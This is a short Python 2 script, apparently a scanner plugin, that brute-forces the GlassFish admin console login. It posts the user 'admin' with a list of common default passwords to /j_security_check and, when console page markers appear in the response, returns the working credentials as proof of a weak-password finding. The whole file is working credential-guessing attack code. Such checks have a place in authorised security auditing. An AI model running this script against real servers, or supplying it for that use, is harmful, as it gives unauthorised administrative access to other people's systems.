# coding:utf-8
# author:wolf
import urllib2
from config import is_port_open, is_http


@is_port_open
def verify(host, port=80, name=None, timeout=10):
    print "[poc_crack_glassfish] [line 7] [info={}]".format("now we are in this file")
    if is_http(host, port) is False:
        return
    url = "http://%s:%d" % (host, int(port))
    error_i = 0
    flag_list = ['Just refresh the page... login will take over', 'GlassFish Console - Common Tasks',
                 '/resource/common/js/adminjsf.js">', 'Admin Console</title>', 'src="/homePage.jsf"',
                 'src="/header.jsf"', 'src="/index.jsf"', '<title>Common Tasks</title>', 'title="Logout from GlassFish']
    user_list = ['admin']
    PASSWORD_DIC = ['admin', '123456', '1234qwer', 'admin888']
    PASSWORD_DIC.append('glassfish')
    for user in user_list:
        for password in PASSWORD_DIC:
            try:
                PostStr = 'j_username=%s&j_password=%s&loginButton=Login&loginButton.DisabledHiddenField=true' % (
                user, password)
                request = urllib2.Request(url + '/j_security_check?loginButton=Login', PostStr)
                res = urllib2.urlopen(request, timeout=timeout)
                res_html = res.read()
            except urllib2.HTTPError:
                return
            except urllib2.URLError:
                error_i += 1
                if error_i >= 3:
                    return
                continue
            for flag in flag_list:
                if flag in res_html:
                    info = {
                        "url": url,
                        "vuln_name": "glassfish weak password",
                        "severity": "high",
                        "proof": "username={}&password={}".format(user, password)
                    }
                    return info
